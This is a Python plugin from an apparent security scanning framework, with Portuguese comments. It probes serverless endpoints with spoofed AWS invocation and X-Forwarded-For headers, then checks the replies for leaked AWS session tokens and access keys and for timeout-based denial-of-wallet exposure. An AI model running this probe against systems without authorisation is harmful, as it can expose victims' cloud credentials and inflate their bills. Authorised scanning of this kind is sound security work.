"""
[+] Plugin: Serverless Event Injection (Serverless/FaaS)
[+] Description: Abuso do mapeamento de API Gateway/Function URLs para vazar contexto
[+] Category: Advanced Web Attacks
[+] CVSS: 7.0 (High)
[+] Author: CASCAVEL Framework
"""

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def run(target, ip, ports, banners):
    finding = None

    # Este ataque geralmente foca no alvo raiz (caso seja uma API REST via AWS/Azure)
    base_url = f"https://{target}" if target else f"http://{ip}"

    headers = {
        "User-Agent": "Cascavel-Serverless-Probe/3.0.1",
        "X-Amz-Invocation-Type": "Event",
        "X-Forwarded-For": "127.0.0.1"
    }

    try:
        # Enviar um JSON vazio, mas com Headers manipulados,
        # forçando o middleware do FaaS a expor metadados em caso de erro.
        resp = requests.post(base_url, json={"context_dump": True}, headers=headers, timeout=5, verify=False)

        # Procura por chaves de ambiente AWS comuns que vazaram em StackTraces
        if "AWS_SESSION_TOKEN" in resp.text or "AWS_ACCESS_KEY_ID" in resp.text:
            finding = {
                "vulnerability": "Serverless Context/Env Leak via Event Injection",
                "severity": "CRITICAL",
                "description": "Função Serverless falhou em tratar entradas manipuladas (Headers de Invocação AWS/Azure) e vazou o Contexto de Execução contendo credenciais temporárias IAM.",
                "endpoint": base_url,
                "payload": "X-Amz-Invocation-Type: Event",
                "evidence": resp.text[:100] + "..."
            }
        elif "Task timed out after" in resp.text:
            finding = {
                "vulnerability": "Serverless Function DoW (Denial of Wallet)",
                "severity": "MEDIUM",
                "description": "Função vulnerável a timeout forçado. Pode ser abusada para consumir a conta cloud da vítima massivamente.",
                "endpoint": base_url,
                "payload": "X-Amz-Invocation-Type: Event",
            }

    except Exception:
        pass

    return finding
